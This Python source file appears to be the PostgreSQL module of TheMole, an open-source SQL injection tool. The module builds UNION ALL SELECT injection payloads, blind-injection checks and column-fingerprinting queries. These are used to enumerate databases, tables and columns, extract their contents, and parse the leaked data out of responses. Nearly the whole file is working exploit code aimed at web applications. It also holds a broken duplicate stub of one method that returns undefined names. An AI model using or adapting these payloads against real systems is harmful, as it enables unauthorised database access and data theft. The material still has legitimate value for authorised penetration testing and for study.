#!/usr/bin/python3
# 
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#       
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#       
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.
#
# Developed by: Nasel(http://www.nasel.com.ar)
# 
# Authors:
# Matías Fontanini
# Santiago Alessandri
# Gastón Traberg

from dbmsmoles import DbmsMole

class PostgresMole(DbmsMole):
    out_delimiter_result = "::-::"
    out_delimiter = DbmsMole.chr_join(out_delimiter_result)
    inner_delimiter_result = "><"
    inner_delimiter = DbmsMole.chr_join(inner_delimiter_result)
    
    def to_string(self, data):
        return DbmsMole.chr_join(data)
        
    def _schemas_query_info(self):
        return {
            'table' : 'pg_catalog.pg_database',
            'field' : 'datname'
        }
    
    def _tables_query_info(self, db):
        return {
            'table' : 'information_schema.tables',
            'field' : 'table_name',
            'filter': "table_schema = '{db}'".format(db=self._db_name(db))
        }
    
    def _columns_query_info(self, db, table):
        return {
            'table' : 'information_schema.columns',
            'field' : 'column_name',
            'filter': "table_schema = '{db}' and table_name = '{table}'".format(db=self._db_name(db), table=table)
        }
        
    def _fields_query_info(self, fields, db, table, where):
        return {
            'table' : table,
            'field' : ','.join(fields),
            'filter': where
        }
        
    def _dbinfo_query_info(self):
        return {
            'field' : 'getpgusername(),version(),current_database()', 
            'table' : 'information_schema.schemata'
        }

    @classmethod
    def dbms_name(cls):
        return 'Postgres'
    
    @classmethod
    def blind_field_delimiter(cls):
        return PostgresMole.inner_delimiter_result
    
    @classmethod
    def dbms_check_blind_query(cls):
        return ' and {op_par}0 < (select length(getpgusername()))'
    
    def forge_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
        query = " and 1 = 0 UNION ALL SELECT "
        query_list = []
        for i in range(column_count):
            query_list.append('(' + DbmsMole.chr_join(str(i)) + ')::unknown')
        query_list[injectable_field] = ("(" + PostgresMole.out_delimiter + "||(" +
                                            ('||' + PostgresMole.inner_delimiter + '||').join(fields.split(',')) +
                                            ")||" + PostgresMole.out_delimiter + ")"
                                        )
        query += ','.join(query_list)
        query += " from " + table_name + " where " + self.parse_condition(where) + \
                 " limit 1 offset " + str(offset)
        return query
    
    @classmethod
    def injectable_field_fingers(cls, query_columns, base):
        
        
        return [(hashes, to_search)]
        
    @classmethod
    def injectable_field_fingers(cls, query_columns, base):
        output = []
        hashes = []
        to_search = []
        for i in range(query_columns):
            hashes.append('(' + DbmsMole.chr_join(str(base + i)) + ')::unknown')
            to_search.append(str(base + i))
        output.append((hashes, to_search))
        for i in range(query_columns):
            hashes = list(map(lambda x: 'null', range(query_columns)))
            to_search = list(map(lambda x: '3rr_NO!', range(query_columns)))
            to_search[i] = str(base + i)
            hashes[i] = str(base + i)
            output.append((list(hashes), to_search))
            hashes[i] = '(' + DbmsMole.chr_join(str(base + i)) + ')::unknown'
            output.append((list(hashes), to_search))
            hashes[i] = '(' + DbmsMole.chr_join(str(base + i)) + ')'
            output.append((hashes, to_search))
        hashes = []
        for i in range(base, base + query_columns):
            hashes.append(DbmsMole.char_concat(str(i)))
        to_search = list(map(str, range(base, base + query_columns)))
        output.append((list(hashes), to_search))
        hashes = []
        for i in range(base, base + query_columns):
            hashes.append(str(i))
        output.append((list(hashes), to_search))
        return output
    
    @classmethod
    def field_finger_query(cls, columns, injectable_field):
        query = " and 1=0 UNION ALL SELECT "
        query_list = []
        for i in range(columns):
            query_list.append('(' + DbmsMole.chr_join(str(i)) + ')::unknown')
        query_list[injectable_field] = "(" + DbmsMole.chr_join(DbmsMole.field_finger_str) + ")::unknown"
        query += ",".join(query_list)
        return query

    @classmethod
    def dbms_check_query(cls, columns, injectable_field):
        return PostgresMole().forge_query(
            columns, 'getpgusername()', 'pg_user', injectable_field
        )

    def _concat_fields(self, fields):
        return ('||' + PostgresMole.inner_delimiter + '||').join(map(lambda x: 'coalesce(' + x + ',CHR(32))', fields))


    def _db_name(self, db):
        if db.startswith('postgres'):
            return 'pg_catalog'
        else:
            return 'public'

    def parse_results(self, url_data):
        data_list = url_data.split(PostgresMole.out_delimiter_result)
        if len(data_list) < 3:
            return None
        data = data_list[1]
        return data.split(PostgresMole.inner_delimiter_result)
    
    def __str__(self):
        return "Posgresql Mole"
